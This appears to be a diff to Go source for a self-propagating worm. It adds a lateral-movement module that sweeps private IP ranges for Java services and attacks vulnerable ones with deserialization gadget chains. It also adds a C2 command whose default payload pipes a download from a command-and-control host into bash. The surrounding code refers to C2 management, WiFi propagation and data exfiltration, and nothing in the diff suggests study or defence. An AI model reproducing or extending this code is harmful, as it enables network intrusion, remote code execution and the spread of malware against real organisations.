@@ -38,6 +38,8 @@ import (
     "golang.org/x/crypto/ssh"
     "golang.org/x/sys/windows"
     "golang.org/x/sys/windows/registry"
+    
+    "worm_bb/jvm_lateral"
 )
 
 // ========== CONSTANTS AND GLOBALS ==========
@@ -883,6 +885,8 @@ func (c2 *C2Manager) processCommands() {
             go c2.updateWorm(cmd)
         case "SLEEP":
             go c2.sleepWorm(cmd)
+        case "JVM_LATERAL":
+            go c2.handleJVMLateral(cmd)
         }
     }
 }
@@ -1055,6 +1059,54 @@ func (c2 *C2Manager) updateWorm(cmd C2Command) {
 func (c2 *C2Manager) sleepWorm(cmd C2Command) {
     duration := cmd.Parameters["duration"].(int)
     time.Sleep(time.Duration(duration) * time.Second)
+}
+
+func (c2 *C2Manager) handleJVMLateral(cmd C2Command) {
+    target := cmd.Target
+    technique := "submap"
+    if p, ok := cmd.Parameters["technique"].(string); ok {
+        technique = p
+    }
+    command := "curl -s http://c2.example.com/jvm_drop | bash"
+    if p, ok := cmd.Parameters["command"].(string); ok {
+        command = p
+    }
+    
+    fmt.Printf("[C2] JVM_LATERAL target=%s technique=%s\n", target, technique)
+    
+    scanner := jvm_lateral.NewJVMScanner()
+    attacker := jvm_lateral.NewJVMAttacker()
+    
+    services := scanner.ScanTargets([]string{target})
+    if len(services) == 0 {
+        c2.sendToC2("JVM_RESULT", map[string]interface{}{
+            "status":  "no_services_found",
+            "target":  target,
+        })
+        return
+    }
+    
+    results := make([]map[string]interface{}, 0)
+    for _, svc := range services {
+        if !svc.Vulnerable {
+            continue
+        }
+        for _, g := range svc.Chains {
+            r := attacker.AttackJVMService(svc, g, command)
+            results = append(results, map[string]interface{}{
+                "target":  r.Target,
+                "gadget":  r.Gadget,
+                "success": r.Success,
+                "output":  r.Output,
+            })
+        }
+    }
+    
+    c2.sendToC2("JVM_RESULT", map[string]interface{}{
+        "status":  "complete",
+        "target":  target,
+        "results": results,
+    })
 }
 
 func (c2 *C2Manager) heartbeatLoop() {
@@ -1308,6 +1360,7 @@ type Worm struct {
     wifiPropagator   *WiFiPropagator
     c2Manager        *C2Manager
     dataExfiltrator  *DataExfiltrator
+    jvmLateral       *jvm_lateral.JVMLateralModule
     status           string
     mu               sync.Mutex
 }
@@ -1329,6 +1382,7 @@ func NewWorm() *Worm {
     w.wifiPropagator = NewWiFiPropagator()
     w.c2Manager = NewC2Manager()
     w.dataExfiltrator = NewDataExfiltrator()
+    w.jvmLateral = jvm_lateral.NewJVMLateralModule()
     
     return w
 }
@@ -1344,6 +1398,13 @@ func (w *Worm) Run() {
     go w.wifiPropagator.Start()
     go w.c2Manager.Start()
     go w.dataExfiltrator.Start()
+    
+    // JVM Lateral Movement — hunts for Java services
+    go w.jvmLateral.Start([]string{
+        "10.0.0.0/8",
+        "172.16.0.0/12",
+        "192.168.0.0/16",
+    })
     
     // Main loop
     w.maintenanceLoop()
